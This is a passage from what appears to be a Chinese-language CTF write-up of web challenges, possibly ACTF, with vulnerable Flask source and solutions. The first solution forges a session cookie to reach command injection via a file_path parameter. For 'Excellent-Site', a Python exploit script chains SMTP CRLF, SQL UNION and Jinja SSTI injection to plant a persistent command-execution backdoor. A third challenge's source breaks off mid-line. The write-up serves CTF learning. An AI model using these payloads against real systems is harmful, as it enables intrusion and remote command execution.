class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&#x27;username&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        f = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        file_path = <span class="built_in">str</span>(uuid.uuid4()) + <span class="string">&#x27;_&#x27;</span> + f.filename</span><br><span class="line">        f.save(<span class="string">&#x27;./uploads/&#x27;</span> + file_path)</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">f&#x27;/upload?file_path=<span class="subst">&#123;file_path&#125;</span>&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> request.args.get(<span class="string">&#x27;file_path&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Upload Image&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">            &lt;form action=&quot;/upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=&quot;submit&quot; value=&quot;Upload&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;/form&gt;</span></span><br><span class="line"><span class="string">            &#x27;&#x27;&#x27;</span></span><br><span class="line">            </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            file_path = <span class="string">&#x27;./uploads/&#x27;</span> + request.args.get(<span class="string">&#x27;file_path&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> session.get(<span class="string">&#x27;username&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    content = f.read()</span><br><span class="line">                    b64 = base64.b64encode(content)</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">f&#x27;&lt;img src=&quot;data:image/png;base64,<span class="subst">&#123;b64.decode()&#125;</span>&quot; alt=&quot;Uploaded Image&quot;&gt;&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                os.system(<span class="string">f&#x27;base64 <span class="subst">&#123;file_path&#125;</span> &gt; /tmp/<span class="subst">&#123;file_path&#125;</span>.b64&#x27;</span>)</span><br><span class="line">                <span class="comment"># with open(f&#x27;/tmp/&#123;file_path&#125;.b64&#x27;, &#x27;r&#x27;) as f:</span></span><br><span class="line">                <span class="comment">#     return f&#x27;&lt;img src=&quot;data:image/png;base64,&#123;f.read()&#125;&quot; alt=&quot;Uploaded Image&quot;&gt;&#x27;</span></span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;Sorry, but you are not allowed to view this image.&#x27;</span></span><br><span class="line">                </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>思路就是先登录普通用户进行任意文件读取，想办法读取secretkey，session伪造，然后想办法伪造到admin用户，在&#x2F;upload下rce。</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250426183935178.png" alt="image-20250426183935178"></p><p>获得了secretkey，可以伪造session了！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S3cRetK3y</span><br></pre></td></tr></table></figure><p>伪造出admin的session：<code>eyJ1c2VybmFtZSI6ImFkbWluIn0.aAy5Hw.sRJasuGzhh6_vfEmJKf8Dh_6R0Q</code></p><p>然后两个包，一个是admin的session，用来rce，一个普通用户的session，用来任意文件读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /upload?file_path=;ls%20/&gt;1.txt; HTTP/1.1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /upload?file_path=../1.txt HTTP/1.1</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250428131012113.png" alt="image-20250428131012113"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ACTF&#123;997590de9be1eacb7883fe&#125;</span><br></pre></td></tr></table></figure><h2 id="Excellent-Site"><a href="#Excellent-Site" class="headerlink" title="Excellent-Site"></a>Excellent-Site</h2><p>源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> smtplib </span><br><span class="line"><span class="keyword">import</span> imaplib</span><br><span class="line"><span class="keyword">import</span> email</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> email.header <span class="keyword">import</span> decode_header</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_subjects</span>(<span class="params">username, password</span>):</span><br><span class="line">    imap_server = <span class="string">&quot;ezmail.org&quot;</span></span><br><span class="line">    imap_port = <span class="number">143</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        mail = imaplib.IMAP4(imap_server, imap_port)</span><br><span class="line">        mail.login(username, password)</span><br><span class="line">        mail.select(<span class="string">&quot;inbox&quot;</span>)</span><br><span class="line">        status, messages = mail.search(<span class="literal">None</span>, <span class="string">&#x27;FROM &quot;admin@ezmail.org&quot;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> status != <span class="string">&quot;OK&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        subject = <span class="string">&quot;&quot;</span></span><br><span class="line">        latest_email = messages[<span class="number">0</span>].split()[-<span class="number">1</span>]</span><br><span class="line">        status, msg_data = mail.fetch(latest_email, <span class="string">&quot;(RFC822)&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> response_part <span class="keyword">in</span> msg_data:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(response_part, <span class="built_in">tuple</span>):</span><br><span class="line">                msg = email.message_from_bytes(response_part  [<span class="number">1</span>])</span><br><span class="line">                subject, encoding = decode_header(msg[<span class="string">&quot;Subject&quot;</span>])  [<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">isinstance</span>(subject, <span class="built_in">bytes</span>):</span><br><span class="line">                    subject = subject.decode(encoding <span class="keyword">if</span> encoding <span class="keyword">else</span> <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        mail.logout()</span><br><span class="line">        <span class="keyword">return</span> subject</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ERROR&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fetch_page_content</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        parsed_url = urlparse(url)</span><br><span class="line">        <span class="keyword">if</span> parsed_url.scheme != <span class="string">&#x27;http&#x27;</span> <span class="keyword">or</span> parsed_url.hostname != <span class="string">&#x27;ezmail.org&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;SSRF Attack!&quot;</span></span><br><span class="line">        response = requests.get(url)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">return</span> response.text</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;ERROR&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ERROR&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/report&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">report</span>():</span><br><span class="line">    message = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        url = request.form[<span class="string">&quot;url&quot;</span>]</span><br><span class="line">        content = request.form[<span class="string">&quot;content&quot;</span>]</span><br><span class="line">        smtplib._quote_periods = <span class="keyword">lambda</span> x: x</span><br><span class="line">        mail_content = <span class="string">&quot;&quot;&quot;From: ignored@ezmail.org\r\nTo: admin@ezmail.org\r\nSubject: &#123;url&#125;\r\n\r\n&#123;content&#125;\r\n.\r\n&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            server = smtplib.SMTP(<span class="string">&quot;ezmail.org&quot;</span>)</span><br><span class="line">            mail_content = smtplib._fix_eols(mail_content)</span><br><span class="line">            mail_content = mail_content.<span class="built_in">format</span>(url=url, content=content)</span><br><span class="line">            server.sendmail(<span class="string">&quot;ignored@ezmail.org&quot;</span>, <span class="string">&quot;admin@ezmail.org&quot;</span>, mail_content)</span><br><span class="line">            message = <span class="string">&quot;Submitted! Now wait till the end of the world.&quot;</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            message = <span class="string">&quot;Send FAILED&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;report.html&quot;</span>, message=message)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/bot&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bot</span>():</span><br><span class="line">    requests.get(<span class="string">&quot;http://ezmail.org:3000/admin&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;The admin is checking your advice(maybe)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>():</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span> ip != <span class="string">&quot;127.0.0.1&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Forbidden IP&quot;</span></span><br><span class="line">    subject = get_subjects(<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;p@ssword&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> subject.startswith(<span class="string">&quot;http://ezmail.org&quot;</span>):</span><br><span class="line">        page_content = fetch_page_content(subject)</span><br><span class="line">        <span class="keyword">return</span> render_template_string(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                &lt;h2&gt;Newest Advice(from myself)&lt;/h2&gt;</span></span><br><span class="line"><span class="string">                &lt;div&gt;<span class="subst">&#123;page_content&#125;</span>&lt;/div&gt;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/news&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">news</span>():</span><br><span class="line">    news_id = request.args.get(<span class="string">&quot;id&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> news_id:</span><br><span class="line">        news_id = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    conn = sqlite3.connect(<span class="string">&quot;news.db&quot;</span>)</span><br><span class="line">    cursor = conn.cursor()</span><br><span class="line"></span><br><span class="line">    cursor.execute(<span class="string">f&quot;SELECT title FROM news WHERE id = <span class="subst">&#123;news_id&#125;</span>&quot;</span>)</span><br><span class="line">    result = cursor.fetchone()</span><br><span class="line">    conn.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> result:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Page not found.&quot;</span>, <span class="number">404</span></span><br><span class="line">    <span class="keyword">return</span> result[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">3000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这道题其实就是通过report向<a href="mailto:&#97;&#x64;&#109;&#105;&#x6e;&#64;&#101;&#122;&#109;&#97;&#105;&#108;&#46;&#x6f;&#114;&#103;">&#97;&#x64;&#109;&#105;&#x6e;&#64;&#101;&#122;&#109;&#97;&#105;&#108;&#46;&#x6f;&#114;&#103;</a>发送邮件，然后我们访问&#x2F;bot，让服务器自身去访问&#x2F;admin路由，通过get_subjects解析出最新邮件的subject，然后对subject进行fetch_page_content，也就是获取subject界面的内容，那么此处subject需要为url，同时在&#x2F;admin路由下可以进行ssti，也就是对subject解析的结果进行ssti模板注入。那么我们又怎么让subject解析的结果中有我们需要的payload呢，可以通过&#x2F;news路由，联合注入来拼接出payload。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ezmail.org:3000/news?id=-1 UNION SELECT &#x27;&#123;&#123;lipsum.__globals__.os.popen(&quot;whoami&quot;).read()&#125;&#125;&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250428130907160.png" alt="image-20250428130907160"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">target=<span class="string">&#x27;http://156.238.233.113:3000/&#x27;</span></span><br><span class="line">target_report=target+<span class="string">&#x27;report&#x27;</span></span><br><span class="line">target_bot=target+<span class="string">&#x27;bot&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bot</span>():</span><br><span class="line">    res_bot=requests.get(target_bot)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;bot respose:&#x27;</span>,res_bot.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">report</span>():</span><br><span class="line">    payload=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    &#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](</span></span><br><span class="line"><span class="string">    \&quot;app.after_request_funcs.setdefault(None, []).append(</span></span><br><span class="line"><span class="string">        lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(</span></span><br><span class="line"><span class="string">            \\\&quot;\\\&quot;\\\&quot;</span></span><br><span class="line"><span class="string">            global CmdResp;</span></span><br><span class="line"><span class="string">            CmdResp = __import__(&#x27;flask&#x27;).make_response(</span></span><br><span class="line"><span class="string">                __import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read()</span></span><br><span class="line"><span class="string">            )</span></span><br><span class="line"><span class="string">            \\\&quot;\\\&quot;\\\&quot;</span></span><br><span class="line"><span class="string">        ) == None else resp</span></span><br><span class="line"><span class="string">    )</span></span><br><span class="line"><span class="string">    \&quot;,</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        &#x27;request&#x27;: url_for.__globals__[&#x27;request&#x27;],</span></span><br><span class="line"><span class="string">        &#x27;app&#x27;: url_for.__globals__[&#x27;current_app&#x27;]</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    )&#125;&#125;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    subject_payload=<span class="string">f&quot;http://ezmail.org/news?id=-1 union select \&quot;<span class="subst">&#123;quote(payload)&#125;</span>\&quot;&quot;</span></span><br><span class="line">    smtp_crlf_content_payload=(</span><br><span class="line">        <span class="string">&quot;aaa\r\n.\r\n&quot;</span></span><br><span class="line">        <span class="string">&quot;From: admin@ezmail.org\r\n&quot;</span></span><br><span class="line">        <span class="string">&quot;To:ignored@ezmail.org\r\n&quot;</span></span><br><span class="line">        <span class="string">f&quot;Subject: <span class="subst">&#123;subject_payload&#125;</span>\r\n&quot;</span></span><br><span class="line">        <span class="string">&quot;\r\naaa&quot;</span></span><br><span class="line">    )</span><br><span class="line">    data=&#123;<span class="string">&quot;url&quot;</span>:<span class="string">&quot;http://www.test.com&quot;</span>,<span class="string">&quot;content&quot;</span>:smtp_crlf_content_payload&#125;</span><br><span class="line">    res_report=requests.post(target_report,data=data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;report respose:&quot;</span>,res_report.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    report()</span><br><span class="line">    bot()</span><br></pre></td></tr></table></figure><h2 id="not-so-web-1"><a href="#not-so-web-1" class="headerlink" title="not so web 1"></a>not so web 1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64, json, time</span><br><span class="line"><span class="keyword">import</span> os, sys, binascii</span><br><span class="line"><span class="keyword">from</span> dataclasses <span class="keyword">import</span> dataclass, asdict</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Dict</span>, <span class="type">Tuple</span></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> KEY, ADMIN_PASSWORD</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> (</span><br><span class="line">    Flask,</span><br><span class="line">    render_template,</span><br><span class="line">    render_template_string,</span><br><span class="line">    request,</span><br><span class="line">    redirect,</span><br><span class="line">    url_for,</span><br><span class="line">    flash,</span><br><span class="line">    session,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = KEY</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@dataclass(<span class="params">kw_only=<span class="literal">True</span></span>)</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">APPUser</span>:</span><br><span class="line">    name: <span class="built_in">str</span></span><br><span class="line">    password_raw: <span class="built_in">str</span></span><br><span class="line">    register_time: <span class="built_in">int</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#  In-memory store for user registration</span></span><br><span class="line">users: <span class="type">Dict</span>[<span class="built_in">str</span>, APPUser] = &#123;</span><br><span class="line">    <span class="string">&quot;admin&quot;</span>: APPUser(name=<span class="string">&quot;admin&quot;</span>, password_raw=ADMIN_PASSWORD, register_time=-<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">validate_cookie</span>(<span class="params">cookie: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> cookie:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cookie_encrypted = base64.b64decode(cookie, validate=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">except</span> binascii.Error:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(cookie_encrypted) &lt; <span class="number">32</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        iv, padded = cookie_encrypted[:<span class="number">16</span>], cookie_encrypted[<span class="number">16</span>:]</span><br><span class="line">        cipher = AES.new(KEY, AES.MODE_CBC, iv)</span><br><span class="line">        cookie_json = cipher.decrypt(padded)</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        _ = 